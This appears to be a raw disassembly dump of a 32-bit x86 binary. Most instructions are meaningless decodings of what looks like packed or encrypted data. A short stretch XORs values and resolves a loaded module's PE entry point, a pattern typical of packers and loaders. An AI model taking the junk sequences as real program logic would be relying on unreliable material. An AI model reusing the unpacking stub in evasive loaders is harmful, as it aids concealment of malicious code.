  4185ee:	jmp    0xd50a:0x3744c20e
  4185f5:	int3   
  4185f6:	lods   eax,DWORD PTR ds:[esi]
  4185f7:	stc    
  4185f8:	and    ch,BYTE PTR [edi+0x5f009d85]
  4185fe:	adc    esi,0xffffff94
  418601:	test   al,0x26
  418603:	jp     0x41861c
  418605:	daa    
  418606:	test   eax,0xa0bf6c6d
  41860b:	scas   al,BYTE PTR es:[edi]
  41860c:	clc    
  41860d:	add    eax,0x65eab740
  418612:	pop    edx
  418613:	arpl   WORD PTR [ebx+0x46],si
  418616:	hlt    
  418617:	cs and esp,0x7b
  41861b:	mov    ebx,0x7cd531b9
  418620:	out    dx,al
  418621:	sbb    DWORD PTR [ebx-0x3a],0x36873842
  418628:	mov    esp,0xe6a938cd
  41862d:	dec    ecx
  41862e:	fnstcw WORD PTR [ebp-0x1912a2c3]
  418634:	test   DWORD PTR [edi-0x27d775ce],eax
  41863a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41863b:	xor    eax,0x91a45dda
  418640:	add    al,0x7b
  418642:	xlat   BYTE PTR ds:[ebx]
  418643:	xchg   esi,eax
  418644:	dec    edx
  418645:	rcl    BYTE PTR [esi],1
  418647:	sbb    ebx,DWORD PTR [edi-0x2e32a1d2]
  41864d:	jae    0x418699
  41864f:	sub    al,dl
  418651:	sbb    DWORD PTR [ebp+0x78],esi
  418654:	lahf   
  418655:	loop   0x418690
  418657:	iret   
  418658:	jb     0x418650
  41865a:	mov    bl,0x7e
  41865c:	call   0x375:0x2f3277ee
  418663:	ret    
  418664:	test   DWORD PTR [ebx+0x22],edx
  418667:	int3   
  418668:	mov    bh,0xf1
  41866a:	sub    ebx,ebp
  41866c:	xor    esi,DWORD PTR [edi-0x11]
  41866f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418670:	pop    esp
  418671:	(bad)  
  418672:	or     al,0xc2
  418674:	es mov dh,0xa4
  418677:	shr    DWORD PTR [eax],0xd5
  41867a:	cmp    DWORD PTR [edi+0x4cae84ea],edi
  418680:	sbb    bh,BYTE PTR [ecx-0x27]
  418683:	mov    bh,0x5f
  418685:	ds js  0x418645
  418688:	mov    fs,WORD PTR [edx+esi*4+0x1a]
  41868c:	sbb    ecx,0xffffff91
  41868f:	mov    eax,0xb30b2305
  418694:	stos   BYTE PTR es:[edi],al
  418695:	aam    0x4a
  418697:	fwait
  418698:	das    
  418699:	push   eax
  41869a:	sar    dh,0xa5
  41869d:	loope  0x4186a0
  41869f:	mov    ds:0x4d3493a3,eax
  4186a4:	mov    eax,0xe8bd1c0f
  4186a9:	scas   al,BYTE PTR es:[edi]
  4186aa:	ins    BYTE PTR es:[edi],dx
  4186ab:	retf   
  4186ac:	and    al,0x31
  4186ae:	adc    ecx,eax
  4186b0:	fld    QWORD PTR [edx+edx*4-0x1a17ddfc]
  4186b7:	iret   
  4186b8:	xor    dl,BYTE PTR [esi*8+0x1e4534d3]
  4186bf:	out    dx,al
  4186c0:	push   cs
  4186c1:	ficomp WORD PTR [eax+0x690001ab]
  4186c7:	ror    BYTE PTR [esi+0x78],0xae
  4186cb:	dec    edi
  4186cc:	xor    eax,0x4cadc4f1
  4186d1:	imul   edi,edx,0x7a
  4186d4:	outs   dx,DWORD PTR ds:[esi]
  4186d5:	or     ch,dl
  4186d7:	cli    
  4186d8:	inc    edx
  4186d9:	lahf   
  4186da:	test   al,0xc4
  4186dc:	mov    ecx,0xd651b78
  4186e1:	ror    cl,cl
  4186e3:	cmp    edi,DWORD PTR [eax+0x2d]
  4186e6:	test   eax,0xf5b3f167
  4186eb:	daa    
  4186ec:	jmp    0xdc0b6358
  4186f1:	inc    edx
  4186f2:	cmc    
  4186f3:	bound  esi,QWORD PTR [edi-0x31d20eb7]
  4186f9:	pop    esp
  4186fa:	and    BYTE PTR [edx-0x1c],bh
  4186fd:	lock pop edi
  4186ff:	(bad)  
  418700:	les    esi,FWORD PTR [eax+eiz*2-0x3f97e1d9]
  418707:	bound  eax,QWORD PTR [ebx+eax*8]
  41870a:	and    ch,dh
  41870c:	rcr    DWORD PTR [bp-0x435c],cl
  418711:	jle    0x4186e6
  418713:	cmp    eax,0x5d3e7908
  418718:	jnp    0x41877f
  41871a:	out    0x66,eax
  41871c:	cdq    
  41871d:	daa    
  41871e:	int3   
  41871f:	push   edi
  418720:	test   BYTE PTR [ebx],bl
  418722:	scas   al,BYTE PTR es:[edi]
  418723:	sub    eax,0xc462c379
  418728:	and    al,0x5e
  41872a:	fisttp QWORD PTR [edi+0x45721c03]
  418730:	aam    0x43
  418732:	xacquire lock sub BYTE PTR [ebx+0x2785d8ce],ah
  41873a:	shl    DWORD PTR [edi-0x5a],1
  41873d:	adc    DWORD PTR [eax],ecx
  41873f:	sbb    BYTE PTR [ebp+0x4a],ah
  418742:	mov    bl,0xee
  418744:	dec    eax
  418745:	push   cs
  418746:	nop
  418747:	adc    DWORD PTR [edx],edx
  418749:	inc    eax
  41874a:	iret   
  41874b:	dec    esi
  41874c:	push   0x767d150d
  418751:	inc    esi
  418752:	push   edi
  418753:	push   cs
  418754:	loopne 0x4186ec
  418756:	inc    ecx
  418757:	add    BYTE PTR [eax],dh
  418759:	lds    esp,FWORD PTR [eax+ebx*2+0x202cc0]
  418760:	adc    DWORD PTR [ebx+0x1b],0xffffffa5
  418764:	call   0x16f546d8
  418769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41876a:	inc    ecx
  41876b:	push   0xfffffff2
  41876d:	out    dx,al
  41876e:	mov    ebx,0x932e318b
  418773:	fldenv [ebp-0x6e]
  418776:	retf   0x4293
  418779:	jmp    0x41871e
  41877b:	mov    gs,WORD PTR [ecx]
  41877d:	add    DWORD PTR [ecx-0x4fbdc26e],esi
  418783:	jb     0x4187d4
  418785:	sbb    al,0xd2
  418787:	call   DWORD PTR [edx]
  418789:	mov    fs,edx
  41878b:	aaa    
  41878c:	pop    ebp
  41878d:	push   esi
  41878e:	push   0xfffffff0
  418790:	mov    ch,0x70
  418792:	jne    0x418724
  418794:	mov    bh,0x7
  418796:	mov    ds:0x4fa766dc,al
  41879b:	ins    BYTE PTR es:[edi],dx
  41879c:	push   es
  41879d:	in     al,dx
  41879e:	(bad)  
  41879f:	mov    eax,ds:0xea21471b
  4187a4:	out    0x77,al
  4187a6:	ret    
  4187a7:	adc    BYTE PTR [ecx+0x1c7f8f25],al
  4187ad:	jae    0x4187c9
  4187af:	jns    0x41879a
  4187b1:	inc    esp
  4187b2:	(bad)  
  4187b3:	out    dx,eax
  4187b4:	mov    dl,BYTE PTR [ecx+eax*4+0x3d19e58c]
  4187bb:	mov    cl,0x16
  4187bd:	aam    0xbf
  4187bf:	(bad)  
  4187c0:	das    
  4187c1:	or     eax,DWORD PTR [edi]
  4187c3:	mov    ebx,esp
  4187c5:	outs   dx,DWORD PTR ds:[esi]
  4187c6:	jecxz  0x41880f
  4187c8:	int3   
  4187c9:	and    DWORD PTR [edi],ebx
  4187cb:	fwait
  4187cc:	lods   al,BYTE PTR ds:[esi]
  4187cd:	fucomp st(1)
  4187cf:	out    dx,al
  4187d0:	lds    eax,FWORD PTR [esp+edi*2+0x37]
  4187d4:	jle    0x41884c
  4187d6:	sub    ah,ah
  4187d8:	out    dx,al
  4187d9:	out    0xda,al
  4187db:	inc    esp
  4187dc:	(bad)  
  4187dd:	push   ss
  4187de:	fistp  DWORD PTR [ebp+ebp*4-0x791973ce]
  4187e5:	popa   
  4187e6:	mov    cl,0xe8
  4187e8:	mov    esp,0xc18173f4
  4187ed:	push   0x8bffcd8d
  4187f2:	icebp  
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0x81c51af2
  41883e:	imul   BYTE PTR [ebx]
  418840:	pop    ss
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	add    eax,0x754266e8
  41884d:	imul   ebx,DWORD PTR [esi+0x64],0x30
  418851:	jle    0x418805
  418853:	lods   al,BYTE PTR ds:[esi]
  418854:	mov    BYTE PTR [edi-0x5c],ah
  418857:	xchg   edi,eax
  418858:	pop    edx
  418859:	std    
  41885a:	inc    eax
  41885b:	neg    DWORD PTR [ebx+0x67bd392c]
  418861:	jae    0x418881
  418863:	mov    esp,0x73d73f27
  418868:	xchg   ebp,eax
  418869:	xchg   edx,eax
  41886a:	into   
  41886b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41886c:	mov    esi,0x4b323e9a
  418871:	lds    esp,FWORD PTR [eax+0x64]
  418874:	mov    dh,0x6
  418876:	test   eax,0xf2bb027
  41887b:	and    al,BYTE PTR ds:0xd05b72a5
  418881:	jne    0x418855
  418883:	ss push eax
  418885:	or     DWORD PTR [ebx],0xffffffd5
  418888:	es xor eax,0x2bb904e9
  41888e:	pop    ecx
  41888f:	sti    
  418890:	div    DWORD PTR [esi+edx*2-0x1c]
  418894:	mov    DWORD PTR [ebx],edx
  418896:	jb     0x41888f
  418898:	and    DWORD PTR [eax],ebp
  41889a:	inc    ebp
  41889b:	in     eax,0x3f
  41889d:	int3   
  41889e:	jb     0x4188e1
  4188a0:	nop
  4188a1:	ss push cs
  4188a3:	jecxz  0x4188a0
  4188a5:	and    eax,0xd2f7fbbf
  4188aa:	call   0xa0bb:0xb81bf78b
  4188b1:	push   0xffffff97
  4188b3:	out    0xcc,eax
  4188b5:	mov    ebx,0xda06fc1f
  4188ba:	jg     0x41890b
  4188bc:	pop    ecx
  4188bd:	test   al,0x9
  4188bf:	sbb    BYTE PTR [ecx],dh
  4188c1:	scas   al,BYTE PTR es:[edi]
  4188c2:	fstp   DWORD PTR [ecx-0x440af10e]
  4188c8:	xor    DWORD PTR [ecx+eiz*1+0x21],ecx
  4188cc:	lea    esp,[ebp+0x1565d2cb]
  4188d2:	mov    bh,0xa3
  4188d4:	cmp    al,0xc9
  4188d6:	jnp    0x4188ec
  4188d8:	ja     0x4188c7
  4188da:	jmp    0x48a1df9c
  4188df:	fisttp QWORD PTR [eax+edi*2+0x11]
  4188e3:	mov    eax,0xc6f353fa
  4188e8:	(bad)  
  4188e9:	fstp   TBYTE PTR [esi+eiz*1]
  4188ec:	repz mov dl,cl
  4188ef:	out    0xd1,eax
  4188f1:	ss xchg edx,esp
  4188f4:	mov    ah,0x52
  4188f6:	add    eax,0x5cc93634
  4188fb:	sbb    bl,cl
  4188fd:	ja     0x418897
  4188ff:	stc    
  418900:	ins    DWORD PTR es:[edi],dx
  418901:	pop    es
  418902:	lea    ecx,[edx]
  418904:	adc    cl,BYTE PTR [edx+0x21]
  418907:	rcr    BYTE PTR [ebp-0x4d],cl
  41890a:	out    dx,eax
  41890b:	lahf   
  41890c:	pop    ds
  41890d:	popf   
  41890e:	dec    esi
  41890f:	dec    edi
  418910:	push   ss
  418911:	push   eax
  418912:	jecxz  0x4188e6
  418914:	hlt    
  418915:	cmp    BYTE PTR ds:[ebx],al
  418918:	cmp    eax,0x7e14764e
  41891d:	ja     0x41893e
  41891f:	mov    bh,0x51
  418921:	mov    ebp,0x63c18afb
  418926:	fild   DWORD PTR [eax+0x543973ba]
  41892c:	test   ecx,ebx
  41892e:	and    edx,edx
  418930:	or     DWORD PTR ds:0x850cd6fc,edi
  418936:	in     al,0x22
  418938:	outs   dx,DWORD PTR ds:[esi]
  418939:	jle    0x418969
  41893b:	imul   esi,edi,0xffffff86
  41893e:	lock aam 0x3
  418941:	arpl   WORD PTR [eax],sp
  418943:	ss mov dh,0xf9
  418946:	dec    ebx
  418947:	ror    al,0x13
  41894a:	or     dh,BYTE PTR [ecx-0x47]
  41894d:	dec    ecx
  41894e:	add    eax,edx
  418950:	rcr    DWORD PTR [ebp-0x51],1
  418953:	sub    dh,0xc0
  418956:	in     eax,0x93
  418958:	dec    edx
  418959:	fsub   st(4),st
  41895b:	push   eax
  41895c:	or     dl,dl
  41895e:	nop
  41895f:	pop    esp
  418960:	cs mov ebp,0x94bb546a
  418966:	std    
  418967:	sti    
  418968:	mov    ah,0x21
  41896b:	add    al,BYTE PTR [eiz*2+0x3339a8b6]
  418972:	jns    0x4189c2
  418974:	pop    esp
  418975:	mov    DWORD PTR [ebp+0x5f],esi
  418978:	dec    esi
  418979:	push   es
  41897a:	pop    edi
  41897b:	scas   eax,DWORD PTR es:[edi]
  41897c:	mov    dh,cl
  41897e:	inc    ecx
  41897f:	xchg   BYTE PTR [edi],al
  418981:	dec    esp
  418982:	rol    DWORD PTR [ebp-0x4c838d52],cl
  418988:	sbb    DWORD PTR [ecx],0x2f03cbf1
  41898e:	sub    bl,BYTE PTR [ecx+0x3e304019]
  418994:	loop   0x41894e
  418996:	rol    dh,cl
  418998:	daa    
  418999:	sub    al,BYTE PTR [edi-0x68]
  41899c:	mov    al,ds:0xe8fe3992
  4189a1:	cmp    ebx,DWORD PTR [ecx]
  4189a3:	inc    ebp
  4189a4:	xor    eax,0x670ebde
  4189a9:	loopne 0x418932
  4189ab:	and    al,0x76
  4189ad:	jae    0x418944
  4189af:	lods   al,BYTE PTR ds:[esi]
  4189b0:	add    edi,DWORD PTR [edx]
  4189b2:	sub    DWORD PTR [edx],ebp
  4189b4:	lock cmp eax,0xab647fd3
  4189ba:	sbb    ebx,esp
  4189bc:	sub    al,0x29
  4189be:	jne    0x4189bc
  4189c0:	test   eax,0x8ded16be
  4189c5:	or     al,0xc2
  4189c7:	loopne 0x418a18
  4189c9:	in     al,dx
  4189ca:	pop    esp
  4189cb:	fwait
  4189cc:	inc    esi
  4189cd:	jo     0x418988
  4189cf:	enter  0x2040,0x7
  4189d3:	and    esp,ecx
  4189d5:	push   ecx
  4189d6:	inc    eax
  4189d7:	push   ds
  4189d8:	rcl    DWORD PTR [esp+ecx*1+0x12],cl
  4189dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189dd:	aam    0xae
  4189df:	xor    BYTE PTR [edi],0x14
  4189e2:	sbb    BYTE PTR [ebx+0xb4b2551],dh
  4189e8:	cmc    
  4189e9:	cmp    DWORD PTR [ecx+0x1331f109],ebx
  4189ef:	pusha  
  4189f0:	sub    esp,edx
  4189f2:	scas   al,BYTE PTR es:[edi]
  4189f3:	adc    eax,0xfea71ca
  4189f8:	xor    DWORD PTR fs:[edi+0x77baaa57],esi
  4189ff:	aas    
  418a00:	int3   
  418a01:	inc    ebx
  418a02:	mov    ?,WORD PTR [ebp-0x3868ad7b]
  418a08:	add    al,0x54
  418a0a:	je     0x418a0a
  418a0c:	out    dx,al
  418a0d:	and    al,0xd3
  418a0f:	pop    esp
  418a10:	fistp  QWORD PTR [eax+0x4f02b2ee]
  418a16:	xchg   edi,eax
  418a17:	mov    edx,0xa7b79c6b
  418a1c:	and    dl,bh
  418a1e:	xor    ch,dh
  418a20:	loope  0x4189ac
  418a22:	cdq    
  418a23:	sbb    DWORD PTR [edx-0x50],ebx
  418a26:	pop    edi
  418a27:	adc    BYTE PTR [edi+0x44ad14fd],0x1
  418a2e:	das    
  418a2f:	pop    ebx
  418a30:	arpl   WORD PTR [edi],cx
  418a32:	add    cl,BYTE PTR [esi-0xc]
  418a35:	or     esi,edx
  418a37:	aas    
  418a38:	cwde   
  418a39:	retf   
  418a3a:	push   es
  418a3b:	cmp    ebx,DWORD PTR [esi+0x7c]
  418a3e:	ds jmp 0x437bdb30
  418a44:	jo     0x4189e4
  418a46:	jl     0x418a66
  418a48:	and    al,0x1d
  418a4a:	ret    
  418a4b:	push   edi
  418a4c:	pop    ecx
  418a4d:	icebp  
  418a4e:	pop    esp
  418a4f:	gs enter 0xfda1,0x8f
  418a54:	test   al,0x7c
  418a56:	add    ch,BYTE PTR [eax]
  418a58:	jmp    0xe828:0xfdd403de
  418a5f:	test   al,0x57
  418a61:	retf   
  418a62:	xor    ah,BYTE PTR [eax+0x33feae99]
  418a68:	mov    BYTE PTR ds:0xceae0419,bl
  418a6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a6f:	loop   0x418a92
  418a71:	sub    BYTE PTR [ecx],al
  418a73:	out    0x2,eax
  418a75:	jmp    0x871dff7
  418a7a:	inc    ecx
  418a7b:	enter  0xb544,0xa6
  418a7f:	int    0x23
  418a81:	mov    cl,0x60
  418a83:	mov    edi,0x67a03e94
  418a88:	xor    ebx,DWORD PTR [edx-0x7b]
  418a8b:	ror    BYTE PTR [eax],cl
  418a8d:	jle    0x418aab
  418a8f:	push   ecx
  418a90:	jp     0x418aea
  418a92:	in     eax,0x88
  418a94:	rcl    DWORD PTR [ecx],0xe6
  418a97:	sub    edx,DWORD PTR [eax+eax*4-0xfab1836]
  418a9e:	fimul  DWORD PTR [esi-0x711b1ea9]
  418aa4:	add    ebx,edi
  418aa6:	jle    0x418ac6
  418aa8:	rol    DWORD PTR [ebx],1
  418aaa:	scas   al,BYTE PTR es:[edi]
  418aab:	repnz ficomp DWORD PTR [esi]
  418aae:	into   
  418aaf:	pop    edi
  418ab0:	mov    eax,ds:0xfb0b05e4
  418ab5:	sub    BYTE PTR [edi+0x1],dh
  418ab8:	xor    DWORD PTR [edx-0x1b],esp
  418abb:	clc    
  418abc:	push   ds
  418abd:	retf   
  418abe:	sbb    eax,0xc3575f9b
  418ac3:	xor    al,0x8b
  418ac5:	xor    bl,BYTE PTR [eax+ebp*2+0x413b4cd6]
  418acc:	sub    ebx,DWORD PTR [edi-0x7a]
  418acf:	loope  0x418b34
  418ad1:	jmp    0xc928:0x837ac718
  418ad8:	fimul  DWORD PTR [eax-0x36]
  418adb:	sub    ah,ah
  418add:	sbb    DWORD PTR [ecx],eax
  418adf:	jge    0x418b05
  418ae1:	sahf   
  418ae2:	xor    DWORD PTR [edi-0x57],edi
  418ae5:	xchg   DWORD PTR [ebp-0x554b36b],edx
  418aeb:	dec    ebp
  418aec:	lock cs mov dl,0xf6
  418af0:	repnz scas eax,DWORD PTR es:[edi]
  418af2:	test   BYTE PTR [ebp-0x68],0xa6
  418af6:	sub    eax,0xba715599
  418afb:	pusha  
  418afc:	aas    
  418afd:	popa   
  418afe:	mov    ds:0x38307b2c,eax
  418b03:	cmp    DWORD PTR [edx+ebx*2+0xb],ebx
  418b07:	das    
  418b08:	lahf   
  418b09:	inc    edi
  418b0a:	xchg   esp,eax
  418b0b:	sahf   
  418b0c:	lods   al,BYTE PTR ds:[esi]
  418b0d:	xchg   edx,eax
  418b0e:	push   ebx
  418b0f:	xchg   ebp,eax
  418b10:	jmp    0x39278c9e
  418b15:	daa    
  418b16:	push   ecx
  418b17:	(bad)  
  418b18:	les    edx,FWORD PTR [esi-0x214410f5]
  418b1e:	out    0x82,eax
  418b20:	ror    ebx,1
  418b22:	and    ch,cl
  418b24:	mov    cl,0xc8
  418b26:	or     BYTE PTR [eax-0x46],bh
  418b29:	jecxz  0x418ad8
  418b2b:	jne    0x418ac1
  418b2d:	xchg   esi,eax
  418b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b2f:	sar    BYTE PTR [ebx],cl
  418b31:	addr16 or dl,ch
  418b34:	rcl    BYTE PTR [esi-0x1a618b69],1
  418b3a:	adc    eax,0x6c013dc9
  418b3f:	outs   dx,BYTE PTR ds:[esi]
  418b40:	xchg   ecx,eax
  418b41:	cwde   
  418b42:	inc    edx
  418b43:	popa   
  418b44:	lods   al,BYTE PTR ds:[esi]
  418b45:	push   DWORD PTR ds:0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	mov    WORD PTR [eax-0x3ced7804],?
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b6f:	xchg   edi,eax
  418b70:	cmp    ah,al
  418b72:	dec    eax
  418b73:	mov    al,ds:0xb7d8fa81
  418b78:	mov    ds:0xe50d5fdb,al
  418b7d:	jecxz  0x418b6b
  418b7f:	cmp    ebx,DWORD PTR [edx-0x1629a78f]
  418b85:	fisttp QWORD PTR [ecx-0x5f]
  418b88:	cld    
  418b89:	cdq    
  418b8a:	inc    eax
  418b8b:	cmp    eax,0x4b5e27d5
  418b90:	je     0x418bba
  418b92:	inc    esp
  418b93:	out    0x22,al
  418b95:	rcl    DWORD PTR [edx],0x87
  418b98:	(bad)  
  418b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b9a:	add    eax,0x58584dd8
  418b9f:	xchg   ebp,eax
  418ba0:	js     0x418b71
  418ba2:	mov    edx,0x92fbc9d6
  418ba7:	icebp  
  418ba8:	lock shl BYTE PTR cs:[eax+0x72],cl
  418bad:	jg     0x418bec
  418baf:	and    ecx,DWORD PTR [ebx+0x4660f2ac]
  418bb5:	inc    ebx
  418bb6:	out    0x5f,al
  418bb8:	or     al,0x3e
  418bba:	inc    eax
  418bbb:	sbb    eax,DWORD PTR [edx]
  418bbd:	inc    ebx
  418bbe:	and    eax,0xf75fea06
  418bc3:	jmp    0x418b4f
  418bc5:	fistp  WORD PTR [eax-0x6f38dddc]
  418bcb:	sub    ecx,DWORD PTR [ecx+0x10]
  418bce:	adc    al,0xf8
  418bd0:	or     dl,BYTE PTR [esi+0xadea71a]
  418bd6:	or     bl,bl
  418bd8:	pop    esp
  418bd9:	inc    esi
  418bda:	mov    dl,0xc2
  418bdc:	or     bl,BYTE PTR [eax+0x10]
  418bdf:	imul   ebx,esp,0xffffffc8
  418be2:	sahf   
  418be3:	test   bl,dl
  418be5:	cmp    eax,0x6261ef0e
  418bea:	repnz add bl,bl
  418bed:	test   DWORD PTR [edi-0x2e63b437],0xb468d775
  418bf7:	mov    ebp,0xf3492507
  418bfc:	pop    ebx
  418bfd:	loop   0x418be6
  418bff:	fldcw  WORD PTR ds:[edx-0x56b6ace2]
  418c06:	in     eax,0xc5
  418c08:	out    dx,al
  418c09:	push   ss
  418c0a:	push   0x95c0a327
  418c0f:	sub    DWORD PTR [ebp-0x35],ecx
  418c12:	jmp    0x418bae
  418c14:	inc    ecx
  418c15:	xlat   BYTE PTR ds:[ebx]
  418c16:	lock adc al,0x23
  418c19:	cwde   
  418c1a:	jns    0x418c8e
  418c1c:	ins    BYTE PTR es:[edi],dx
  418c1d:	ja     0x418beb
  418c1f:	rcr    dl,cl
  418c21:	cmp    eax,0x66702018
  418c26:	push   0xffffffa1
  418c28:	inc    eax
  418c29:	lds    ebp,FWORD PTR ds:0xd34f9e62
  418c2f:	pop    ecx
  418c30:	faddp  st(1),st
  418c32:	adc    al,0xfa
  418c34:	ss clc 
  418c36:	push   0xffffff8c
  418c38:	fmul   QWORD PTR [ebp+0x45]
  418c3b:	mov    esi,0x1b74cb67
  418c40:	cmc    
  418c41:	jo     0x418bdd
  418c43:	xchg   edx,eax
  418c44:	test   DWORD PTR [esi-0x3011229e],eax
  418c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c4b:	loop   0x418cc0
  418c4d:	sub    ecx,DWORD PTR [ebp+0x1c2efe0c]
  418c53:	(bad)  
  418c54:	xor    ch,BYTE PTR [esi-0x4e]
  418c57:	dec    ebp
  418c58:	inc    ecx
  418c59:	stc    
  418c5a:	mov    ebx,esp
  418c5c:	out    dx,al
  418c5d:	mov    esi,0xec090504
  418c62:	sub    eax,edi
  418c64:	adc    ebx,edx
  418c66:	leave  
  418c67:	pusha  
  418c68:	xor    al,0x30
  418c6a:	sbb    DWORD PTR [ebx+eiz*4+0x16],esi
  418c6e:	retf   0xa608
  418c71:	jb     0x418c60
  418c73:	mov    eax,ds:0x16ac0c36
  418c78:	lock dec esi
  418c7a:	mov    ds:0x4436438c,eax
  418c7f:	inc    edi
  418c80:	push   esi
  418c81:	adc    esi,DWORD PTR [esi]
  418c83:	int3   
  418c84:	adc    bl,BYTE PTR [ebp+0x13]
  418c87:	adc    DWORD PTR [esi],edi
  418c89:	ds sbb eax,0xbb4d201d
  418c8f:	mov    ds:0xe348d308,al
  418c94:	add    ah,BYTE PTR [esi-0xc]
  418c97:	loope  0x418cfe
  418c99:	in     al,0x71
  418c9b:	sbb    ebx,esi
  418c9d:	daa    
  418c9e:	xor    al,0xc0
  418ca0:	push   ss
  418ca1:	cs in  eax,0x6a
  418ca4:	sbb    ecx,edx
  418ca6:	xor    BYTE PTR [edx+0x6a2042b1],bh
  418cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cad:	adc    cl,BYTE PTR ds:0xa57413a7
  418cb3:	sti    
  418cb4:	sub    dh,BYTE PTR [esi]
  418cb6:	clc    
  418cb7:	in     eax,0x19
  418cb9:	or     al,0xf8
  418cbb:	mov    ch,0xa3
  418cbd:	or     bh,BYTE PTR [esi]
  418cbf:	mov    ?,WORD PTR [edx+ebp*8-0x16b6c5bb]
  418cc6:	call   0x524f:0xdf7cf9de
  418ccd:	das    
  418cce:	xchg   edi,eax
  418ccf:	repnz stos BYTE PTR es:[edi],al
  418cd1:	stos   DWORD PTR es:[edi],eax
  418cd2:	cmc    
  418cd3:	ret    0xb359
  418cd6:	sub    ecx,edx
  418cd8:	nop
  418cd9:	fs jns 0x418d08
  418cdc:	les    esp,FWORD PTR [ebp+0x5ad73f5]
  418ce2:	pusha  
  418ce3:	adc    eax,0xce39eb5c
  418ce8:	stos   BYTE PTR es:[edi],al
  418ce9:	or     bh,BYTE PTR [edi]
  418ceb:	adc    BYTE PTR [ebp+0x61],al
  418cee:	inc    esi
  418cef:	sub    al,0xbf
  418cf1:	xor    esi,ebp
  418cf3:	push   ebp
  418cf4:	xchg   esp,eax
  418cf5:	mov    ebp,?
  418cf7:	aas    
  418cf8:	push   cs
  418cf9:	xchg   edx,eax
  418cfa:	push   ebp
  418cfb:	aam    0xed
  418cfd:	lock sbb eax,0xebc2ee0e
  418d03:	inc    esp
  418d04:	in     eax,dx
  418d05:	cmp    DWORD PTR [ecx],edi
  418d07:	aas    
  418d08:	je     0x418cbc
  418d0a:	mov    ds:0x866c06b,eax
  418d0f:	xor    esp,DWORD PTR [edx]
  418d11:	cdq    
  418d12:	dec    ebx
  418d13:	jp     0x418d42
  418d15:	push   edx
  418d16:	pop    ecx
  418d17:	loopne 0x418d81
  418d19:	out    0x19,eax
  418d1b:	mov    eax,0x506cc41a
  418d20:	and    al,BYTE PTR [edi+0x186a3cc4]
  418d26:	mov    dl,0xd1
  418d28:	mov    ebx,0xdf0a78b9
  418d2d:	jmp    0x418ce5
  418d2f:	dec    esp
  418d30:	mov    ds:0xf2fe125a,al
  418d35:	fsubr  DWORD PTR [edi+0x60d8b10e]
  418d3b:	mov    ecx,0xec9f4481
  418d40:	call   0xa252:0xa81c55cd
  418d47:	mov    ecx,DWORD PTR [ebp+0x5635eae8]
  418d4d:	sub    DWORD PTR [ebp-0x33],eax
  418d50:	inc    ebp
  418d51:	shl    DWORD PTR [eax+esi*8+0x1d],cl
  418d55:	mov    BYTE PTR [edi-0x4fd14312],bh
  418d5b:	cmp    eax,0x6393ac33
  418d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d61:	pusha  
  418d62:	popf   
  418d63:	scas   eax,DWORD PTR es:[edi]
  418d64:	mov    ebp,0xb20d6af0
  418d69:	cmp    esi,esi
  418d6b:	cmp    BYTE PTR [ecx+0x59dcf10b],al
  418d71:	das    
  418d72:	and    al,0xcd
  418d74:	call   0x5cae:0xe0c4c8f3
  418d7b:	sbb    BYTE PTR [esi-0x54674482],0x4d
  418d82:	push   es
  418d83:	push   eax
  418d84:	jne    0x418df1
  418d86:	shl    DWORD PTR [eax+0x772650e1],cl
  418d8c:	dec    esi
  418d8d:	push   0xffffff9d
  418d8f:	shl    BYTE PTR [ebx],cl
  418d91:	fsub   st(0),st
  418d93:	xchg   esi,eax
  418d94:	out    0x51,al
  418d96:	mov    ch,0xb1
  418d98:	dec    edi
  418d99:	push   0x67
  418d9b:	or     eax,0xe6e4ef3
  418da0:	shl    BYTE PTR gs:[ebx-0x76819941],1
  418da7:	into   
  418da8:	lods   eax,DWORD PTR ds:[esi]
  418da9:	sub    DWORD PTR [edx-0x50],0x8
  418dad:	sub    eax,0x4113865f
  418db2:	inc    eax
  418db3:	add    eax,0x2910c726
  418db8:	iret   
  418db9:	lock jecxz 0x418d5b
  418dbc:	mov    DWORD PTR ds:0xf0f91ff8,ecx
  418dc2:	mov    ebp,0xf6e5b3e0
  418dc7:	pop    eax
  418dc8:	or     al,0x88
  418dca:	idiv   BYTE PTR [ebp-0x55]
  418dcd:	lea    edi,[ebp-0x5]
  418dd0:	nop
  418dd1:	pop    esp
  418dd2:	daa    
  418dd3:	loope  0x418df1
